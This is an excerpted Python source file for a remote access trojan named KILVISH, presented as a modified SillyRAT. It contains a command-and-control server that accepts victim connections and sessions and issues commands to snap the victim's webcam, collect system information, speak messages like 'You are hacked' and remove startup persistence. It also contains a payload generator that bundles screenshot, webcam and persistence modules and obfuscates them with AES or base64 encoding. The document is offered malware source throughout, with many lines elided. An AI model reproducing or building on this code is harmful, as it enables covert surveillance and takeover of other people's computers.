...
from encoder.aesencrypt import encrypt
from encoder.Base64_encode import Encode
...
██║  ██╗██║███████╗╚████╔╝ ██║███████║██║  ██║
╚═╝  ╚═╝╚═╝╚══════╝ ╚═══╝  ╚═╝╚══════╝╚═╝  ╚═╝
              LET ALWAYS BE THE DARK
               %s v1.0 @SIDDHANT385/MODIFIED VERSION OF SILLYRAT BY hash3liZer 
"""
...
'--help' argument. For example: 'python3 KILVISH generate --help'
will print help manual for generate commmand 
"""

__HELP_BIND__   = """usage: python3 KILVISH.py bind [--address ADDRESS] [--port PORT]
...
__HELP_GENERATE__ = """
usage: python3 KILVISH.py generate [--address ADDRESS] [--port PORT] [--output OUTPUT]
    ...
    -e, --encode    aes(AES) or b64(base64) please type shortname only
                    Encodes the payload with Aes encryption
...
class PULL:
    ...
    def logo(self):
        print(self.RED + __LOGO__ % self.YELLOW + self.END)
    ...
    def help_c_current(self):
        ...
        lister  = [
            ...
            ('webcam', 'Take a webcam snap on local machine'),
            ('exit', 'Exit from KILVISH!'),
            ('speak', 'Speaks the voice'),
            ('advancedinfo', 'Get advance system information'),
            ('Unistall', 'Uninstalls the program from client startup')
        ]
        sys.stdout.write("\n")
    ...
    def help_c_uninstall(self):
        sys.stdout.write("\n")
        print("Info       : Uninstall")
        print("Arguments  : None")
        print("Example    : \n")
        print("$ Uninstall")
        sys.stdout.write("\n")
    ...
    def help_c_voice(self):
        sys.stdout.write("\n")
        print("Info       : Speak Module!")
        print("Arguments  : words you have to speak")
        print("Example    : \n")
        print("$ speak Hellow world")
        print("$ speak You are hacked\n")
        headers = (pull.BOLD + 'Argument' + pull.END, pull.BOLD + 'Description' + pull.END)
    ...
    def help_c_advsysinfo(self):
        sys.stdout.write("\n")
        print("Info       : Gathers advanced system information!")
        print("Arguments  : None")
        print("Example    : \n")
        print("$ sysinfo")
        sys.stdout.write("\n")
    ...
    def help_c_webcam(self):
        sys.stdout.write("\n")
        print("Info       : Grabs the webcam image shot and save it on server!")
        print("Arguments  : None")
        print("Example    : \n")
        print("$ webcam")
        sys.stdout.write("\n")
...
class COMMCENTER:
    ...
    def c_help(self, vals):
        if len(vals) > 1:
            if vals[1] == "sessions":
                ...
                pull.help_c_voice()
            elif vals[1] == "advancedinfo":
                pull.help_c_advsysinfo()
            elif vals[1] == "uninstall":
                pull.help_c_uninstall()
    ...
    def c_connect(self, args):
        if len(args) == 2:
            ...
            if tgt:
                self.CURRENT = tgt[0]
                self.HOSTNAME = self.HOSTNAMES[tgt[1]-1]
            else:
                sys.stdout.write("\n")
    ...
    def c_sessions(self):
        headers = (pull.BOLD + 'ID' + pull.END, pull.BOLD + 'IP Address' + pull.END, pull.BOLD + 'Incoming Port' + pull.END, pull.BOLD + 'Status' + pull.END, pull.BOLD + 'Hostname' + pull.END)
        lister = []

        for i, client in enumerate(self.CLIENTS):
            try:
                client[1].send_data(" :")
                hostname = client[1].recv_data()
            ...
            toappend.append(pull.GREEN + hostname + pull.END)
            ...
            if len(args) == 2:
                if args[1] == "status":
                    ...
                    if not os.path.isdir(dirname):
                        os.mkdir(dirname)
                    dirname = os.path.join( dirname, '%s' % (self.HOSTNAME) )
                    if not os.path.isdir(dirname):
                        os.mkdir(dirname)
    ...
    def c_uninstall(self):
        if self.CURRENT:
            self.CURRENT[1].send_data("uninstall:")
            result = self.CURRENT[1].recv_data()
            if result.strip(" "):
                print(result)
        else:
    ...
    def c_speak(self,words):
        if self.CURRENT:
            sentence = ""
            for word in words:
                sentence += word+" "
            print(sentence)
            self.CURRENT[1].send_data(f"{sentence}:")
            result = self.CURRENT[1].recv_data()
            if result.strip(" "):
                print(result)
        else:
    ...
    def c_advsysinfo(self):
        if self.CURRENT:
            self.CURRENT[1].send_data("advancedinfo")
            result = self.CURRENT[1].recv_data()
            dirname = os.path.dirname(__file__)
            dirname = os.path.join( dirname, 'SystemInformation' )
            if not os.path.isdir(dirname):
                os.mkdir(dirname)
            dirname = os.path.join( dirname, '%s' % (self.HOSTNAME) )
            if not os.path.isdir(dirname):
    ...
    def c_exit(self):
        sys.stdout.write("\n")
        pull.exit("LET ALWAYS BE THE DARK!\n")
...
class INTERFACE(COMMCENTER):
    ...
    def accept_threads(self):
        ...
        while self.RUNNER:
            ...
            notification.notify(title = "CLIENT CONNECTED",message = "client connected with ip:port" + addr[0],timeout=10)
            conn.setblocking(1) 
            is_valid = True
    ...
    def execute(self, vals):
        if vals:
            if vals[0] == "exit":
                ...
                self.c_webcam()
            elif vals[0].startswith("speak"):
                print(vals)
                self.c_speak(vals)
            elif vals[0] == "advancedinfo":
                self.c_advsysinfo()
            elif vals[0] == "uninstall":
                self.c_uninstall()
...
class GENERATOR:
    ...
    def get_screenshot(self):
        ...
        return data
    def get_addons(self):
        topen = os.path.join(self.pather, 'addons.py')
        fl = open(topen)
        data = fl.read()
        fl.close()
        return data
    ...
    def aesencode(self):
        time.sleep(2)
        pull.function("Encrypting payload..... with aes")
        self.data = self.v_consts + "\n" + self.v_sysinfo + "\n\n" + \
                self.v_screenshot + "\n\n" + self.v_webcam+ "\n\n" + self.v_persistence+ "\n\n" + self.v_addons+ "\n\n"  + self.v_client + "\n\n" + self.v_main
        time.sleep(2)
        f1 = open("encoder/inclient.py",'w')
        f1.write(self.data)
        f1.close()
        encrypt("encoder/inclient.py")
        f2 = open("encoder/inclient.py",'r')
        self.encoded = f2.read()
    
    def Base64incoder(self):
        time.sleep(2)
        pull.function("Encrypting payload with b64.....")
        self.data = self.v_consts + "\n" + self.v_sysinfo + "\n\n" + \
                self.v_screenshot + "\n\n" + self.v_webcam+ "\n\n" + self.v_persistence+ "\n\n" + self.v_addons+ "\n\n"  + self.v_client + "\n\n" + self.v_main
        time.sleep(2)
        f1 = open("encoder/inclient.py",'w')
        ...
        f1.close()
        encode = Encode()
        encode.encode("encoder/inclient.py")
        f2 = open("encoder/inclient.py",'r')
        self.encoded = f2.read()

    def patchencoded(self):
        time.sleep(2)
        pull.function("Compiling modules ... ")
        if self.encode.lower() == "b64":
            self.Base64incoder()
...
class PARSER:
    ...
    def __init__(self, prs):
        ...
        if self.mode == "bind":
            ...
            self.source  = prs.source
            self.encode = self.v_encode(prs.encode)
...
def main():
    ...
    parser.add_argument('-o', '--output' , dest="output" , default="payload/script.py", type=str, help="Complete Path to Output File!")
    parser.add_argument('-s', '--source' , dest="source" , default=False, action="store_true", help="Source file")
    parser.add_argument('-e', '--encode' , dest="encode" , default="",type=str , help="Encode file with Aes or Base64")
    ...
    if parser.mode == "bind":
        ...
        if generator.source and generator.encode:
            generator.patchencoded()
        elif generator.source:
                generator.patch()
        elif generator.encode:
            generator.encodegenerate()
            generator.compile()
            generator.clean()
        else:
            generator.generate()
